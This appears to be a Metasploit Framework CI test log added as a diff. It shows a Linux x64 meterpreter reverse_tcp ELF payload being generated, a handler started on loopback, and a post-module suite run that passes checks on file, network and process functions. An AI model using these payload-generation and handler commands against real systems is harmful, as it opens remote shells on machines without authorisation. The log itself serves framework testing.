@@ -1,0 +1,91 @@
+use linux/x64/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/railgun[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20231026-3271-fyorx6txt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20231026-3271-pjgycr -f elf AutoVerifySessionTimeout=30 lport=6008 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20231026-3271-llvozftxt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> SessionTlvLogging => file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20231026-3271-fyorx6txt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> [*] Writing 250 bytes to /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20231026-3271-pjgycr...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 7
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6008 
+[*] Sending stage (3045380 bytes) to 127.0.0.1
+[*] Meterpreter session 8 opened (127.0.0.1:6008 -> 127.0.0.1:43032) at 2023-10-26 19:04:28 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=8 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /tmp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-trucflmi
+[*] meterpreter-test-dir-trucflmi created
+[*] Setup: Now in /tmp/meterpreter-test-dir-trucflmi
+[*] Running against session 8
+[*] Session type is meterpreter and platform is linux
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Starting filesystem tests
+[*] [should return the proper directory separator] received sysinfo {"Computer"=>"fv-az77-778.bprubkmdfdkerap53zvqdzdb0e.jx.internal.cloudapp.net", "OS"=>"Ubuntu 20.04 (Linux 5.15.0-1050-azure)", "Architecture"=>"x64", "BuildTuple"=>"x86_64-linux-musl", "System Language"=>nil, "Domain"=>nil, "Logged On Users"=>nil}
+[*] [should return the proper directory separator] Received separator "/" - expected: "/"
+[+] should return the proper directory separator
+[*] [should return the current working directory] CWD: /tmp/meterpreter-test-dir-trucflmi
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] [should stat a directory] Current directory: "/tmp/meterpreter-test-dir-trucflmi"
+[*] [should stat a directory] Stat of current directory: #<#<Class:0x00007fc5f51a8958>:0x000055c1d8320b00 @stathash={"st_dev"=>2049, "st_mode"=>16877, "st_nlink"=>2, "st_uid"=>1001, "st_gid"=>127, "st_rdev"=>0, "st_ino"=>96806, "st_size"=>4096, "st_atime"=>1698347068, "st_mtime"=>1698347068, "st_ctime"=>1698347068}>
+[+] should stat a directory
+[*] [should create and remove a dir] Directory Name: meterpreter-test-dir-lzfugtpj
+[*] [should create and remove a dir] Directory created successfully
+[*] [should create and remove a dir] Directory removed successfully
+[+] should create and remove a dir
+[*] [should change directories] Directory Name: meterpreter-test-dir-lzfugtpj
+[*] [should change directories] Directory created successfully
+[*] [should change directories] Old CWD: /tmp/meterpreter-test-dir-trucflmi
+[*] [should change directories] New CWD: /tmp/meterpreter-test-dir-trucflmi/meterpreter-test-dir-lzfugtpj
+[*] [should change directories] Back to old CWD: /tmp/meterpreter-test-dir-trucflmi
+[*] [should change directories] Directory removed successfully
+[+] should change directories
+[*] [should create and remove files] File Name: meterpreter-test-lzfugtpj
+[*] [should create and remove files] Wrote to meterpreter-test-lzfugtpj, checking contents
+[*] [should create and remove files] Wrote test
+[+] should create and remove files
+[*] [should upload a file] Remote File Name: meterpreter-test-file-lzfugtpj.txt
+[*] [should upload a file] uploading
+[*] [should upload a file] done
+[*] [should upload a file] remote file exists? true
+[+] should upload a file
+[*] [should move files] Source File Name: meterpreter-test-lzfugtpj
+[*] [should move files] Destination File Name: meterpreter-test-lzfugtpj-moved
+[+] should move files
+[*] [should copy files] Source File Name: meterpreter-test-lzfugtpj
+[*] [should copy files] Destination File Name: meterpreter-test-lzfugtpj-copied
+[+] should copy files
+[*] [should do md5 and sha1 of files] Remote File Name: meterpreter-test-file-lzfugtpj.txt
+[*] [should do md5 and sha1 of files] uploading
+[*] [should do md5 and sha1 of files] done
+[*] [should do md5 and sha1 of files] remote file exists? true
+[*] [should do md5 and sha1 of files] remote md5: 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] local md5 : 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] remote sha: 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[*] [should do md5 and sha1 of files] local sha : 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[+] should do md5 and sha1 of files
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] [should return its own process id] Pid: 3394
+[+] should return its own process id
+[*] [should return a list of processes] PID info: {"pid"=>3394, "ppid"=>3271, "name"=>"child-process-rb-linux-x---meterpreter-reverse-tcp20231026-3271-pjgycr", "path"=>"/tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20231026-3271-pjgycr", "session"=>nil, "user"=>"runner", "arch"=>"x86_64"}
+[+] should return a list of processes
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Testing complete in 0.15 seconds
+[*] Passed: 20; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 8 closed.
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
